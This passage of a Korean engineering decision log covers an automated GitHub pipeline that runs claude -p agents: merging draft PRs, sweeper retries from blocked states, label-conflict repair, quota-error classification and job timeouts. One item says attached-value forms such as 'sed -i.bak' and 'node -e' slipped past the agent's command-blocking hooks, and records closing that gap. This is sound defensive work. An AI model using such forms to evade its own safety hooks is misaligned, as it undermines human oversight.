2. **아티팩트 경로는 폴백을 갖는다**(I1) — `CLAUDE_TRANSCRIPTS`를 굳히는 스텝이 setup **뒤**에 있었고, setup이 실패하면 그 env가 빈 채로 `if: always()`인 업로드 스텝이 돈다. 그러면 경로가 `/**/*.jsonl` — 러너 **루트**에 앵커된 glob — 이 되고 `if-no-files-found: ignore`라 아무 소리도 내지 않는다. 스텝을 **첫 스텝**으로 올려 `if: always()`를 달고(순수한 `echo … >> $GITHUB_ENV`라 체크아웃보다 앞이어도 된다), 경로에 `|| format('{0}/.factory/out', github.workspace)` 폴백을 넣었다. 방어는 두 겹이다. `factory/lib/yml-lint.js`에 `env-path-no-fallback` 규칙을 더해 `${{ env.… }}`로 시작하면서 `||`가 없는 artifact path를 거부한다(같은 파일의 `tilde-path` 규칙은 이제 따옴표를 벗기고 본다 — 따옴표 하나로 비켜 갈 수 있으면 규칙이 아니다).
3. **재점화 마커는 dispatch보다 먼저 남긴다**(M4) — 마커가 dedupe의 유일한 근거이므로, dispatch 성공 뒤 코멘트가 실패하면 sweeper가 30분마다 같은 스테이지를 계속 민다. 순서를 뒤집어 실패가 **덜 재시작하는 쪽**으로 기울게 했다(놓친 재점화는 사람이 `--remote`로 되살릴 수 있지만, 반복 재점화는 돈이다).
4. **back-pressure로 세워 둔 이슈는 멈춘 것이 아니다**(M5) — `factory:planned`는 implement가 흐름 제어에 걸려 **라벨을 건드리지 않고** 물러났을 때도 그대로 남는다. sweeper가 그것을 밀면 새 런이 같은 이유로 또 물러나고 코멘트만 쌓인다. implement 팔은 dispatch 직전에 `backPressure()`(run-stage가 보는 바로 그 헬퍼)를 sweep당 한 번 물어보고, 거부면 dispatch도 코멘트도 하지 않는다.
5. **L1 거부 문구를 규칙별로 가른다**(I3) — `policyViolations`는 additive-only 위반과 사라진 lessons 파일을 같은 배열에 싣는데, 하나의 제목으로 뭉치면 "`## Examples`에만 추가하세요"라는 설명이 lessons 삭제 위에 붙는다. `merge-stage.js`가 목록을 규칙으로 갈라 각자의 제목·설명으로 내고, 한 PR이 둘 다 어기면 두 섹션이 함께 실린다. 같은 맥락에서 `integrity.js`는 "지워졌다"(`deleted or moved away`)와 "트리에 있는데 읽히지 않는다"(`unreadable`)를 다른 사유로 낸다 — 판정은 같지만 문구가 같으면 사람이 있지도 않은 삭제를 diff에서 찾는다(M8).
6. **`factory run … --remote`는 `-R <repo>`를 명시한다**(M7) — 없으면 `gh workflow run`이 cwd의 git remote로 저장소를 고르는데, 이 경로는 로컬 체크아웃을 전제하지 않는다(init 여부도 보지 않는다). `resolveRepo`(KTB-4의 단일 출처)로 해석하고, 해석 실패는 읽을 수 있는 에러로 끝낸다. `--remote`는 argv 어느 위치에서도 받는다.
7. **tier 라벨은 전이보다 먼저**(M2) — 라벨을 붙이는 것도 `issues: labeled` 이벤트라, 그 이벤트가 만드는 5-런 물결이 뒤에 오면 전이가 막 띄운 다음 스테이지의 PENDING 런을 concurrency 슬롯에서 밀어낸다(KTB-8이 죽은 방식 그대로). 코드의 순서는 원래 옳았으나 이유가 어디에도 없었다 — 주석과 테스트로 고정했다.

**영향**: `factory/bin/run-stage.js`(진입 가드·`issueLabels` dep·tier 주석), `factory/lib/labels.js`(`ENTRY_LABELS`), `factory/lib/sweeper.js`·`factory/bin/sweep.js`(마커 순서·back-pressure 면제), `factory/lib/merge-stage.js`(규칙별 섹션), `factory/lib/integrity.js`(`unreadable` 사유·`LESSONS_POLICY_RULE`), `factory/lib/yml-lint.js`(`env-path-no-fallback`·따옴표 벗기기), `factory/cli/run.js`(`-R`·플래그 위치), `templates/factory/github/workflows/factory-{triage,plan,implement,review,retro}.yml`, 스펙 §4.1(concurrency/dispatch 스니펫·가드 문장·sweeper 재점화 행).

**알려진 한계**: 가드는 라벨을 **한 번** 읽는다 — 그 조회와 스테이지 본체 사이에 사람이 라벨을 바꾸면 가드는 옛 답으로 통과시킨다(그 뒤는 전이 그래프가 받는다). 그리고 가드가 exit 0으로 물러나는 것은 dispatch가 **정상적으로** 늦게 도착한 경우와 사람이 잘못된 스테이지를 손으로 민 경우를 구분하지 않는다 — 둘 다 런 기록 한 줄로만 남는다.

#### KTB-15 — draft PR은 절대 머지될 수 없다 (그리고 머지만 실패한 런은 approved로 되돌아간다)

**질문**: 데모 #8은 triage·plan·implement·review를 전부 통과하고 merge에서 죽었다 — `gh pr merge failed (1): GraphQL: Pull Request is still a draft`, 40초, `factory:approved → factory:blocked`. implement 워크플로는 `gh pr create --draft`로 PR을 열고(`templates/factory/claude/workflows/factory-implement.js`, `gh.js`의 `createDraftPr`) 파이프라인 어디에도 ready로 되돌리는 코드가 없었다. 즉 **어떤 PR도 자동 머지될 수 없었다** — 게이트·리뷰·무결성·정책을 전부 통과해도 마지막 한 걸음에서 GitHub이 거부한다. 파이프라인이 merge까지 도달한 것이 이번이 처음이라 이제야 드러났다.

**결정**: draft로 여는 것은 **유지한다**(리뷰 중인 PR을 사람이 실수로 머지하는 것을 막는 신호다). 대신 머지 직전에 뒤집는다.

1. `gh.prReady(pr)` = `gh pr ready <n> -R <repo>`. 이미 ready인 PR에도 exit 0이라 **멱등**이다 — 재시도 런이 상태를 따로 묻지 않는다.
2. `merge-stage.js`가 그것을 **`mergePr` 바로 앞**에서 부른다: 보호 경로(KTB-5)·역할 섹션 정책(KTB-6)·게이트·필수 체크·무결성이 **전부** 통과한 뒤다. 그 앞에 두면 거부된 PR이 ready로 남아 사람이 실수로 머지할 수 있게 되는데, draft는 바로 그 사고를 막는 장치다. 실패는 머지 실패와 같은 등급(`factory:blocked` — 아직 머지되지 않았으므로 되돌릴 것이 없고 재시도로 풀릴 수 있다), 사유는 `ready-for-review failed: …`.
3. 전이 그래프에 **`factory:blocked → factory:approved`**(§3.2). 머지만 실패한 런은 고칠 것이 코드가 아니므로 `planned`로 되돌려 이미 GREEN인 구현을 다시 돌 이유가 없다. 요구조건은 그대로 물린다 — `requirements.js`의 approved 규칙이 review handoff·이번 런의 GREEN `gates.json`·PR head 일치를 계속 요구하므로 이 엣지가 "승인을 건너뛰는 문"이 되지는 않는다. sweeper의 blocked 팔은 **그대로** 유예 뒤 needs-human으로 올린다(재시도는 사람의 판단이다). 사람 경로는 sweeper 주석과 `:unstick`의 선택지 목록에 적었다: `transition.js <n> factory:approved --human` → `factory run merge <n> --remote`.

**관측자 제안 중 채택하지 않은 것**: "`still a draft` 실패를 `needs-human`으로 재분류". 원인을 고친 뒤에는 그 문자열이 다시 나올 자리가 없고, 등급을 문자열 매칭으로 나누는 것은 GitHub 메시지 변경에 그대로 깨진다. blocked → approved 엣지가 같은 목적(사람이 되살릴 수 있다)을 문자열 없이 달성한다.

**알려진 마찰(미해결)**: 사람 경로의 `transition.js … factory:approved --human`은 `gatesGate`가 요구하는 **이번 런의 GREEN `gates.json`**을 그대로 요구한다(`--human`으로도 건너뛸 수 없다는 것이 기존 판결이다). 러너 밖에서 손으로 실행하면 그 파일이 없어 거부된다 — 그때의 길은 sweeper가 올린 `needs-human → queue`(전체 재실행)뿐이다. 게이트 파일을 러너 아티팩트에서 복원하는 경로를 열 것인지는 다음 라운드의 판단으로 남긴다.

→ **KTB-15b가 이 마찰을 닫았다**: 이 문서의 `transition.js <n> factory:approved --human` 경로는 KTB-15b(아래)로 사라졌다 — 사람의 재시도는 이제 `factory run merge <n> --remote` 하나다(`factory-blocked-origin` 마커로 run-stage의 진입 가드가 재시도 자격을 판정한다).

**영향**: `factory/lib/gh.js`, `factory/lib/merge-stage.js`, `factory/bin/run-stage.js`(dep), `factory/lib/labels.js`, `factory/lib/sweeper.js`(주석), `templates/know-thy-build/unstick.md`, `factory/test/{merge-stage,gh,labels}.test.js`.

#### KTB-15b — blocked 재시도는 사람 손이 아니라 마커와 sweeper로: 머지·triage·plan·implement 전부

**질문**: KTB-15가 연 `factory:blocked → factory:approved` 엣지의 "알려진 마찰(미해결)"이 실제로 걸렸다 — 문서가 안내하는 사람 경로 `node .factory/bin/transition.js <n> factory:approved --human`은 `requirements.js`의 `gatesGate`가 **로컬** `.factory/out/gates.json`(이번 런이 만든 GREEN 파일)을 요구하는데, 러너 밖 사람의 셸에는 그 파일이 없다 — 그래서 그 경로는 항상 거부됐다. 유일하게 남은 길은 sweeper가 유예 뒤 올리는 `needs-human → queue`, 곧 리뷰까지 통과한 구현을 통째로 다시 도는 것뿐이었다.

**결정**: 사람 손 대신 **런타임이 스스로 재시도**한다.

1. **`ENTRY_LABELS`에 `factory:blocked`를 추가**한다 — merge뿐 아니라 triage·plan·implement까지 네 스테이지 모두(`factory/lib/labels.js`). 재시도할 값어치가 있는 것은 그 blocked이 **그 스테이지 자신의 정상 진입 라벨**(queue/ready/planned·in-progress/approved)에서 왔을 때뿐이다 — 그 사실은 `lib/transition.js`가 `factory:blocked`로 가는 모든 성공한 전이에 **그 순간** 남기는 마커 `<!-- factory-blocked-origin from=<label> stage=<stage> -->`가 유일한 출처다(코멘트 이력을 다시 파싱해 추측하지 않는다). `BLOCKED_RETRY` 표가 스테이지별 허용 origin과 "확인되면 곧장 되돌아갈 라벨(hop)"을 정의한다. origin이 안 맞으면 전이 없이 거부한다(`"<stage>: blocked did not originate from … — nothing to retry"`).
2. **merge만 hop을 늦춘다.** triage/plan/implement는 origin이 확인되는 즉시 그 라벨로 되돌아가 나머지 로직을 정상 진입처럼 잇는다. merge는 다르다 — 라벨을 되돌리는 것 자체가 "게이트를 다시 GREEN으로 확인했다"는 증거여야 하므로, `merge-stage.js`가 (4) 게이트 재확인을 마친 **뒤에** `retryFromBlocked`로 `approved`로 되돌리고, 그다음에야 mergeGates·prReady·mergePr를 잇는다. `factory:blocked → factory:queue`·`→ factory:ready` 엣지를 그래프에 추가했다(`→ approved`는 KTB-15가 이미 열어 뒀다).
3. **sweeper의 blocked 팔이 한 번은 먼저 시도한다.** 같은 마커를 읽어 origin → 재시도 스테이지(`queue→triage, ready→plan, planned/in-progress→implement, approved→merge`)로 dispatch하고, stalled 팔과 같은 재점화 마커(`factory-sweeper restarted stage=<s> issue=<n>`)로 dedupe한다 — 한 번 밀었는데 여전히 blocked이면 다음 sweep에서 곧장 needs-human으로 올린다. 사람 경로는 이제 `factory run merge <n> --remote`(또는 해당 스테이지) 하나뿐이다 — `--human` 스크립트 단계가 사라졌다(`templates/know-thy-build/unstick.md`).
4. **I1 — `ready_for_review` 레이스.** merge-stage의 draft→ready 플립(KTB-15, `gh pr ready`) 자체가 `ready_for_review` PR 이벤트를 만든다 — 그 이벤트를 듣는 워크플로(`factory-integrity.yml`)가 diff는 그대로인데 머지 직전에 새 필수 체크 런을 또 띄우면 `gh pr merge`와 경합한다. `factory-integrity.yml`의 트리거에서 `ready_for_review`를 뺐고(`yml-lint`에 `ready-for-review-trigger` 규칙을 추가해 되돌아오지 못하게 고정), `merge-stage.js`는 prReady 직후 `mergeGates()`를 최대 3회·10초 간격으로 재확인한 뒤에야 머지한다(대상 저장소가 자신만의 리스너를 달아 뒀을 수 있어서 — 우리 워크플로만 고쳐서는 못 막는다).
   → **KTB-19가 이 재확인 메커니즘을 대체했다**: 고정 3회·10초는 새 체크가 재확인 창이 끝날 때까지도 `queued`이면 그대로 blocked였다(데모 #8의 재시도가 실제로 그렇게 죽었다) — 이제 "몇 번"이 아니라 필수 체크가 더 이상 진행 중이 아닐 때까지 기다린다.
5. **I3 — 산출물 후보 순서 버그.** `stage-artifact.js`의 `extractStageArtifact`는 다른 모든 후보군(task-notification·개별 tool_result·Workflow 결과)을 **최신이 먼저**로 훑는데, 파일 재조립 후보(`fileReadsFromTranscript`)만 경로가 **처음 등장한 순서**(사실상 오래된 순서)였다 — 세션 초반에 읽은 낡은 파일과 나중에 다시 쓴 진짜 산출물이 둘 다 스키마를 통과하면 낡은 쪽이 이겼다. `.reverse()` 한 줄로 나머지 후보와 같은 방향을 맞췄다.
6. **KTB-13 r2의 gap 1 항목 두 개를 닫는다.** `sed -i.bak`/`sed --in-place=…`와 `node -e"…"`/`-p"…"`처럼 값이 **붙은** 형태는 그 규칙들의 원래 경계 검사(`([[:space:]=]|$)`)를 통과하지 못해 빠져나가고 있었다 — curl/cp/mv가 KTB-13 r2에서 이미 받은 것과 같은 관용(플래그 글자가 뭉치 안에 있다는 사실로 충분하다)을 `deny-all-writes.sh`·`block-dangerous.sh` 양쪽에 적용했다.

**M1(사후 감사 개선)**: `verifyStage`가 `extractStageArtifact`의 `source`(어느 후보가 이겼는지)를 그동안 계산만 하고 버려 왔다 — 이제 반환값에 실어 나르고, `run-stage.js`가 `artifact: <source>` 한 줄로 run 기록에 남긴다.

**영향**: `factory/lib/labels.js`(`ENTRY_LABELS`·`BLOCKED_RETRY`·`TRANSITIONS`), `factory/lib/transition.js`(origin 마커, `stage` 인자), `factory/lib/retro/issue-comments.js`(`blockedOrigin`), `factory/bin/run-stage.js`(진입 가드 일반화, `artifact:` 기록), `factory/lib/merge-stage.js`(`retryFromBlocked`, I1 재확인 루프), `factory/lib/sweeper.js`(blocked 팔 일반화), `factory/lib/yml-lint.js`(`ready-for-review-trigger`), `.github/workflows/factory-integrity.yml` + 템플릿, `factory/lib/stage-artifact.js`(I3), `factory/lib/verify-stage.js`(M1), `factory/hooks/{deny-all-writes,block-dangerous}.sh`, `factory/bin/retro.js`(retro의 `--max-turns`도 하드코딩 5 대신 `stageMaxTurns`), `templates/know-thy-build/unstick.md`. 테스트: `labels.test.js`·`transition.test.js`·`issue-comments.test.js`(신규)·`run-stage.test.js`·`merge-stage.test.js`·`sweeper.test.js`·`yml-lint.test.js`·`stage-artifact.test.js`·`verify-stage.test.js`·`hooks.test.js`·`retro-bin.test.js`.

#### KTB-18 — 손으로 얹은 라벨이 만드는 상태 모호성은 조용히 죽지 않는다: 코멘트하고, sweeper가 고친다

**질문**: §12.4 skip-attempt probe(이슈 #14) — 사람이 아직 `backlog`가 붙어 있는 이슈에 `factory:approved`를 손으로 얹었다. `run-stage merge`는 `factoryLabelOf`가 정확히 설계한 대로 거부했다(`issue must carry exactly one factory state label, found: backlog, factory:approved`) — 그런데 그 거부가 **어디서도 잡히지 않았다**. 진입 라벨 가드(`run-stage.js`)는 이 예외를 삼켜 "entry state: unreadable"로만 기록하고 조용히 진행을 계속했고, 그 뒤 `d.transition`이 (라벨을 다시 읽어) 같은 예외를 또 던졌는데, 이번엔 아무도 잡지 않아 최상위 try/catch까지 올라가 `console.error` + exit 1로 죽었다 — 이슈 코멘트도, 전이도 없었다. 결과: 이슈는 두 라벨을 영원히 달고 앉아 있고, 아무도 그 사실을 몰랐다(정확한 거부가 **침묵한 거부**였다).

**결정**: 판정 불가는 여전히 판정 불가다(둘 중 어느 라벨이 "진짜"인지 알 근거가 없으므로 전이는 하지 않는다) — 하지만 판정 불가라는 사실 자체는 절대 조용히 넘기지 않는다.

1. **`run-stage.js`가 직접 상태 라벨 개수를 센다**(`STATES`, `lib/labels.js` — `factoryLabelOf`의 catch에 기대 예외 메시지를 파싱하지 않는다). 2개 이상이면: 이슈에 코멘트 `<!-- factory-label-set-invalid labels=<a,b> -->` + 어떤 라벨들이 붙어 있는지, factory가 왜 이 스테이지를 실행하지 않는지, sweeper가 다음 sweep에서 정리한다는 한 줄 설명을 남기고(best-effort — 코멘트가 실패해도 거부 자체는 잃지 않는다), 런 레코드에 흔적을 남기고 **exit 1**로 끝낸다. 전이는 시도하지 않는다.
2. **sweeper에 새 팔 "라벨-셋 복구"를 추가한다**(`sweepLabelSetRepair`). `gh.issueList({state:"open"})`로 열린 이슈 전체를 훑어(라벨 필터 없이 — 2개 이상 상태 라벨을 가진 이슈는 어느 단일 라벨 검색으로도 확실히 걸러지지 않는다) 상태 라벨(카탈로그의 상태 목록, `backlog` 포함)이 2개 이상인 이슈를 찾으면, `gh.setFactoryLabel(n, "factory:needs-human")`로 라벨 셋을 정확히 그 하나로 맞춘다(다른 상태 라벨은 제거, tier 라벨은 유지 — `setFactoryLabel`이 이미 그 계약이다) — 사람의 손 편집을 고치는 것이므로 L1이다. 코멘트 `<!-- factory-label-set-repaired from=<a,b> -->`를 마커로 한 번만 남긴다(dedupe).
3. 이 두 조각은 서로 다른 층이다: (1)은 즉시(다음 스테이지 런이 뜨자마자) 사람에게 말하고, (2)는 최대 sweep 주기 안에 라벨을 실제로 고쳐 이슈를 정상 그래프(`needs-human → queue`)로 되돌린다.

**영향**: `factory/bin/run-stage.js`(진입 가드), `factory/lib/sweeper.js`(`sweepLabelSetRepair`), `factory/test/{run-stage,sweeper}.test.js`.

#### KTB-19 — 머지 재시도는 "아직 존재하지도 않는 체크"와 경합했다: 횟수가 아니라 상태로 기다린다

**질문**: 데모 #8의 blocked→approved 재시도(KTB-15b)가 `gh pr ready`까지는 성공했지만 `gh pr merge`가 `Required status check "factory/integrity" is queued`로 실패했다. 원인: 그 PR 브랜치는 업그레이드 **이전**에 만들어져 낡은 `integrity.yml`(`ready_for_review` 트리거 포함)을 그대로 갖고 있었다 — ready 플립이 새 필수 체크를 막 밀어 넣었고, KTB-15b I1의 고정 3×10초 재확인 창이 그 체크가 `queued`인 채로 끝나버렸다.

**결정**: "몇 번 다시 물어볼까"가 아니라 "필수 체크가 더 이상 진행 중이 아닌가"로 기다린다.

1. `merge-stage.js`의 `waitForChecksSettled`가 `d.prChecks(pr)`(원시 `gh pr checks`)를 폴링해 required 체크 중 `queued`/`pending`/`in_progress`가 하나도 없을 때까지 기다린다 — 상한 `harness.factory.merge_check_wait_sec`(기본 600초, `config.js`), 간격 15초(`MERGE_CHECK_POLL_INTERVAL_MS`). 첫 조회는 즉시(대부분은 이미 안정돼 있다).
2. 안정된 뒤에만 판정한다: 필수 체크 중 하나라도 RED로 끝났으면 그 이름을 대며 `factory:blocked`("required check(s) failed: …"), 시간 안에 안정되지 않으면 "checks still pending after `<n>`s"로 `factory:blocked` — 둘 다 재시도로 풀린다(§KTB-15b, `factory run merge <n> --remote` 또는 sweeper의 한 번짜리 자동 재시도). 안정+GREEN이면 `mergeGates()`를 한 번 더 불러 무결성(`prChecks`가 보지 못하는 것)까지 확인한 뒤 머지한다.
3. **남는 틈, 그리고 그 방어선**: `gh pr checks`는 대상 저장소가 `ready_for_review`에 반응해 **아직 만들지도 않은** 체크 런을 볼 수 없다. 그 마지막 레이스는 이 폴링이 닫지 않는다 — 그 체크가 실제로 required로 걸려 있다면 branch protection이 `gh pr merge` 자체를 거부하고, 그 실패는 이미 `factory:blocked`로 떨어져 같은 재시도 경로를 탄다.
4. **리뷰 지적 두 건도 같은 커밋에서 닫는다**(KTB-19 review): **I-1** — sweeper의 blocked 팔이 stalled 팔과 **같은** 재점화 마커(`restartComment`)를 재사용해, "stalled가 먼저 밀었다가 그 런이 blocked으로 떨어지는" 정상 경로에서 한 번의 공짜 재시도가 조용히 사라졌다 — 별도 마커 `factory-sweeper blocked-retry stage=<s> issue=<n>`로 완전히 갈랐다. **I-2** — 머지 재시도는 (4b)가 게이트를 재확인해 라벨을 `approved`로 되돌리기 **전까지** 여전히 `factory:blocked`다. 그 창 안에서 또 판정 불가가 나면(gates BLOCKED, protectedPaths/policyViolations 계산 실패) "전이"는 그래프에 없는 `blocked→blocked` 자기 전이가 되어 엉뚱한 그래프-거부 코멘트를 남겼다 — `factory:blocked → factory:rework`(CONFLICTING 재시도) 엣지를 추가하고, blocked→blocked는 `toBlocked()` 헬퍼가 라벨을 건드리지 않은 채 record만 남기고 `factory-blocked-origin` 마커를 직접 재게시한다(전이를 안 거치므로 `transition.js`가 대신 남겨주지 않는다).

**영향**: `factory/lib/merge-stage.js`(`waitForChecksSettled`, `toBlocked`), `factory/lib/config.js`(`merge_check_wait_sec` 기본값), `factory/bin/run-stage.js`(`prChecks`/`requiredChecks`/`mergeCheckWaitSec` dep, origin hoist), `factory/lib/labels.js`(`blocked→rework` 엣지), `factory/lib/transition.js`·`factory/lib/retro/issue-comments.js`(`blockedOriginMarker` 공유), `factory/lib/sweeper.js`(`blockedRetryComment`). 테스트: `merge-stage.test.js`·`config.test.js`·`labels.test.js`·`sweeper.test.js`.

#### KTB-22 — claude -p의 API 쿼터/장애는 needs-human이 아니라 blocked다: 3번은 사람 없이 다시 본다

**질문**: 2026-09-12 20:20Z, 데모 세 스테이지(구현 둘 — #2 라운드 4 implement·#15 implement, 계획 하나 —
#18 plan)가 **동시에** 죽었다. 셋 다 같은 봉투다:

```
is_error: true, subtype: "success", api_error_status: 429, terminal_reason: "api_error",
num_turns: 1, duration_ms: 299,
result: "You've hit your org's monthly spend limit · ask your admin to raise it at
         claude.ai/admin-settings/usage · your session limit resets 8:30pm (UTC)"
```

`run-stage`/`verify-stage`는 이것을 여느 `is_error`와 똑같이 다뤘다 — `stage artifact missing or
invalid: claude -p reported is_error; no candidate matched the stage schema — transcript: the
Workflow tool result is a background receipt…`를 사유로 남기고 `factory:needs-human`으로 전이했다.
등급도 사유도 틀렸다: 사람이 판단할 산출물도, 고쳐야 할 프롬프트도 없다 — **조직의 월 지출 한도가
찼을 뿐**이고, 299 ms·1턴 만에 죽었으니 트랜스크립트에 산출물이 있을 리도 없다(KTB-16/17의 "복구"가
애초에 해당하지 않는 경우). 세 스테이지가 몰린 것 자체가 신호다 — 이건 프롬프트 문제가 아니라
계정 전체에 걸린 환경 조건이다.

**결정**: `hitMaxTurns`(KTB-16)와 같은 자리에, 같은 모양으로 `hitApiError`를 세운다.

1. **판정은 세 가지 중 하나만 있어도 선다**(CLI/게이트웨이 버전에 따라 필드가 갈릴 수 있어 하나만
   보면 조용히 놓친다): `terminal_reason === "api_error"`, `api_error_status`가 4xx/5xx 정수, 또는
   `result`가 `/spend limit|rate limit|usage limit|overloaded|529|429/i`에 매치. 마지막 것은 그
   필드 두 개를 못 채우는 옛/다른 CLI 경로를 위한 안전망이다(`factory/lib/verify-stage.js`).
2. **사유는 프로바이더 메시지 원문이다.** "claude -p reported is_error"는 사람에게 아무것도 말해
   주지 않는다 — `claude -p api error <status>: <result 첫 줄, 200자 절단>`을 그대로 싣는다
   (`apiErrorReason`). 스키마 진단은 KTB-16처럼 그 뒤에 부가 정보로 붙는다.
3. **등급은 `factory:blocked`다.** 쿼터/장애는 설계 오류가 아니라 **환경 조건**이다 — gates
   BLOCKED·턴 한도(KTB-16)·머지 API 실패와 같은 자리다. 그래프는 이미 이 네 스테이지 전부에
   `→ blocked` 출구를 갖고 있다(KTB-16이 queue/ready에, KTB-15b가 planned/in-progress/approved에
   이미 열어 뒀다) — 새 엣지는 필요 없었다.
4. **단, 트랜스크립트를 먼저 본다(KTB-16/17과 같은 규칙).** 스키마를 통과하는 산출물을 실제로
   복구했으면 그 런은 성공이고, 게이트도 그때는 돈다(건너뛰면 복구한 산출물이 "gates file missing"
   으로 되떨어진다) — `run-stage.js`의 게이트 게이팅 조건에 `hitApiError(out)`을 더했다. 이번 사고는
   1턴·299 ms라 복구할 것이 없었지만, 규칙 자체는 max_turns와 다를 이유가 없다.
5. **retro도 같은 사유를 쓴다.** `bin/retro.js`의 `claude -p`가 API 에러로 죽으면 회차는 이미
   무해하게 실패한다(라벨을 옮기지 않고, `merges_since`를 리셋하지 않아 다음 머지가 다시 시도하고,
   커서도 그대로다) — 바뀌는 것은 `_retro.md`의 `last_full_failed.reason`이 "claude -p reported
   is_error" 대신 프로바이더 메시지 원문을 담는다는 것뿐이다. 트랜스크립트 복구는 시도하지 않는다
   (retro의 실패는 사이드 이펙트가 없어 복구해서 얻는 게 없다 — 3에서 4로 넘어가는 이유이기도 하다).
6. **sweeper는 3번까지 다시 본다.** blocked-origin 재시도(KTB-15b)는 원래 "이슈+스테이지당 평생
   한 번"이었다 — 판정 불가의 흔한 원인(GitHub API 순간 실패)이 한 번으로 대개 풀리기 때문이다.
   조직 지출/속도 한도는 다르다: 몇 분~몇 시간 뒤에 풀리는 게 보통이고, sweep 간격(기본 30분)만큼
   띄워 몇 번 다시 보는 것이 곧장 사람을 부르는 것보다 싸다. `blocked-origin` 마커의 전이 사유가
   `api error`를 담고 있으면(`blockedOrigin(comments).reason`, `lib/retro/issue-comments.js`가
   전이 코멘트의 "→ factory:blocked — …" 줄에서 함께 읽는다) 한도를 3회로 넓힌다 — 재점화 마커
   (`blockedRetryComment`)가 몇 번째 시도인지(`attempt=N`)를 싣고, sweeper가 그 최댓값으로 다음
   시도 번호를 센다. 3번째마저 blocked이면 4번째 sweep에서 needs-human으로 에스컬레이션한다.
   일반 blocked-origin(사유에 "api error"가 없는 경우)은 예전처럼 한 번뿐이다 — 마커도 `attempt`
   없이 예전과 바이트가 같아 KTB-15b/19의 기존 dedupe 계약을 건드리지 않는다.

**영향**: `factory/lib/verify-stage.js`(`hitApiError`·`apiErrorReason`), `factory/bin/run-stage.js`
(게이트 게이팅·verify 실패 등급에 `hitApiError` 추가), `factory/bin/retro.js`(is_error 사유 분기),
`factory/lib/retro/issue-comments.js`(`blockedOrigin`이 `reason`도 함께 반환), `factory/lib/sweeper.js`
(`blockedRetryComment`의 `attempt` 인자, `API_ERROR_MAX_RETRIES`, blocked 팔의 시도 카운팅). 테스트:
`verify-stage.test.js`(429 판정·사유·복구 3종), `run-stage.test.js`(blocked 등급·마커·복구+게이트
2종), `retro-bin.test.js`(사유 치환 1건), `issue-comments.test.js`(`reason` 필드 4건),
`sweeper.test.js`(3회 재시도 후 에스컬레이션, 일반 blocked은 그대로 1회).

**r1 (2026-09-13) — 자유 텍스트 폴백은 corroboration 없이 혼자 서면 안 되고, 4xx는 다 같은 등급이
아니다.**

원래 폴백(결정 1의 세 번째 갈래, `result`가 `/spend limit|rate limit|.../i`에 매치)은 문구 하나로
판정했다 — 그런데 이 정규식은 **에이전트가 API 에러를 언급·서술한 정상 실행**과 **claude -p 자신이
API 에러로 죽어 그 프로바이더 텍스트가 `result` 전체가 된 경우**를 구분하지 못한다. 예컨대
`error_during_execution`으로 6턴을 다 쓰고 "재시도 핸들러가 스로틀되면 429를 반환하도록
구현했다"고 끝난 정상 완료를, 문구 하나만 보고 API 에러로 오판하면 진짜 실패 사유(설계·구현
자체의 문제일 수 있다)가 "환경 조건"으로 둔갑해 사람에게 가야 할 것이 조용히 재시도로 흡수된다.

1. **폴백은 이제 세 가지로 뒷받침돼야 선다**(`corroboratedApiErrorText`, `hitApiError` 안): `out.is_error
   === true`(성공 응답 안의 서술은 대상이 아니다), 매치가 **trim한 `result`의 맨 앞**에서 시작한다
   (프로바이더 에러 텍스트가 **결과 전체**일 때만 신뢰한다 — 긴 서술 중간의 언급은 걸러낸다), 그리고
   `num_turns <= 2` 또는 `duration_ms < 5000`(진짜 API 에러는 거의 즉시 죽는다; 6턴짜리 정상 실행
   끝의 결과는 무엇을 말하든 API 에러가 아니다). **구조적 신호**(`terminal_reason === "api_error"`
   또는 숫자 `api_error_status`)는 전과 같이 그 자체로 선다 — corroboration이 필요한 것은 폴백뿐이다.
2. **비일시적 4xx는 사람의 몫이다.** `api_error_status`가 {400, 401, 403, 404, 422}(자격증명·요청
   형식·존재하지 않는 리소스 — 재시도로 안 풀리는 *설정* 문제)면 레코드에는 여전히 API 에러로 남기고
   프로바이더 메시지를 그대로 싣지만(`apiErrorReason`은 안 바뀐다), 등급은 `factory:blocked`이 아니라
   `factory:needs-human`이다 — 사람이 자격증명/설정을 고쳐야 다음 시도가 다르게 끝난다. 408(요청
   타임아웃)·425(Too Early)·429(rate limit)와 모든 5xx는 여전히 **일시적**이라 `factory:blocked`
   그대로다(sweeper의 ≤3회 blocked-origin 재시도, 결정 6). 새 판정 함수
   `isNonTransientApiError`(`factory/lib/verify-stage.js`)가 이 집합을 갖고, `run-stage.js`의 verify
   실패 등급 분기(`blocked = hitMaxTurns(out) || (hitApiError(out) && !isNonTransientApiError(out))`)
   가 그것으로 목적지를 가른다. sweeper는 바뀌지 않는다 — needs-human으로 간 4xx는 애초에 sweeper의
   blocked 팔에 나타나지 않는다.

**영향(r1)**: `factory/lib/verify-stage.js`(`hitApiError`의 corroboration, 새 export
`isNonTransientApiError`), `factory/bin/run-stage.js`(verify 실패 등급 분기). 테스트:
`verify-stage.test.js`(corroboration 5종 + 429/실제 사고 회귀), `run-stage.test.js`(401 →
needs-human, 429/503 → blocked).

#### KTB-24 — 잡 타임아웃은 사건이지 침묵이 아니다: 한도를 올리고, 잘린 잡이 스스로 뒷정리한다

**질문**: 2026-09-13 03:54:03Z에 시작한 데모 #15의 review(run 34736609544)가 04:39:22Z에 `cancelled`로
끝났다 — **45 m 19 s**, 곧 `factory-review.yml`의 `timeout-minutes: 45`에 정확히 걸렸다. 대상은 PR #20
(+709/−19, 파일 10개)이고 리뷰어는 4역할이었다. 남은 것:

```
이슈 라벨      : factory:awaiting-review (그대로)
전이 코멘트    : 없음
run 기록       : implement 섹션에서 끝남 — review 섹션 자체가 없다
마지막 하트비트: 04:34:27 (타임아웃 5분 전)
claim 락       : refs/heads/factory/lock-15  ← 고아
```

두 가지가 틀렸다. ① **한도가 일의 크기에 맞지 않았다** — 라운드 5의 리뷰들은 24~31분이었지만 이
규모에서는 45분을 넘겼고, 재실행도 같은 크기의 PR을 같은 한도로 리뷰하므로 다시 걸릴 가능성이 높다
(무한 루프의 상한은 `charter.limits.R`뿐이다). ② **잘린 잡이 아무 말도 남기지 않았다** — 취소는
`runStage`의 `finally`(락 해제·기록 동기화)를 실행하지 않는다(프로세스가 SIGKILL로 사라진다). 잡
로그에는 "The operation was canceled."만 남아 **사람의 `gh run cancel`과 구분되지도 않는다**(관측자는
이 세션에서 `gh run cancel`을 한 번도 부르지 않았음을 명령 이력으로 확인했다).

**결정**:

1. **§4.1 표의 상한을 올린다**: review 45 → **90**(implement과 같다 — 둘 다 에이전트가 코드를 실제로
